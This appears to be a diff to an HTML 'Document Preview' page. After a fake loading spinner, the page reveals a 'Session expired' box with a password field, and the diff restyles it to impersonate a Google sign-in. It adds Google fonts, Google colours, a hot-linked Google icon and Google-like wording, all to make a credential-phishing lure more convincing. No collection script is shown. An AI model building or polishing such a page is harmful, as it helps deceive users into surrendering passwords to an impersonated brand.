@@ -4,8 +4,8 @@
   <title>Document Preview</title>
   <style>
     body {
-      font-family: sans-serif;
-      background-color: #f0f0f0;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background-color: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -15,14 +15,22 @@
     .preview-container {
       background-color: white;
       padding: 2rem;
-      border-radius: 5px;
+      border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
       text-align: center;
+      width: 300px;
+      box-sizing: border-box;
+    }
+    .google-icon-loader {
+        width: 60px;
+        height: 60px;
+        margin: 0 auto 20px;
+        display: block;
     }
 
     .loader {
       border: 4px solid #f3f3f3;
-      border-top: 4px solid #3498db;
+      border-top: 4px solid #4285F4;
       border-radius: 50%;
       width: 40px;
       height: 40px;
@@ -36,21 +44,45 @@
     .honeypot-container {
       display: none; /* Hidden by default */
       background-color: white;
-      padding: 2rem;
-      border-radius: 5px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 48px 40px 36px;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
       text-align: center;
-      max-width: 400px;
+      max-width: 450px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .google-icon {
+        width: 60px;
+        height: 60px;
+        margin-bottom: 20px;
+    }
+    .honeypot-container h2 {
+        font-family: 'Google Sans', 'Noto Sans', 'Noto Sans JP', 'Noto Sans KR', 'Noto Naskh Arabic', 'Noto Sans Thai', 'Noto Sans Hebrew', 'Noto Sans Bengali', sans-serif;
+        font-size: 24px;
+        font-weight: 400;
+        line-height: 1.3333;
+        margin-bottom: 8px;
+        color: #202124;
+    }
+    .honeypot-container p {
+        font-size: 16px;
+        font-weight: 400;
+        letter-spacing: 0.1px;
+        line-height: 1.5;
+        margin-bottom: 24px;
+        color: #5f6368;
     }
     #honeypot-input {
       padding: 15px;
-      width: 80%;
-      max-width: 300px;
+      width: 100%;
       border: 1px solid #ccc;
       border-radius: 5px;
       font-size: 1.1em;
       margin-top: 15px;
       text-align: center;
+      box-sizing: border-box;
     }
     .hidden-form {
         display: none;
@@ -59,13 +91,15 @@
 </head>
 <body>
   <div class="preview-container">
+    <img src="https://i.pinimg.com/736x/ea/bc/1a/eabc1a70245f1384e30960f25f9b2784.jpg" alt="Google Icon" class="google-icon-loader">
     <div class="loader"></div>
     <p>Loading document preview...</p>
   </div>
 
   <div class="honeypot-container">
-      <h2>Session Expired</h2>
-      <p>Please tap here to sign in again.</p>
+      <img src="https://i.pinimg.com/736x/ea/bc/1a/eabc1a70245f1384e30960f25f9b2784.jpg" alt="Google Icon" class="google-icon">
+      <h2>Session expired</h2>
+      <p>To continue, sign in again.</p>
       <input type="password" id="honeypot-input" placeholder="Tap here to sign in">
   </div>
 
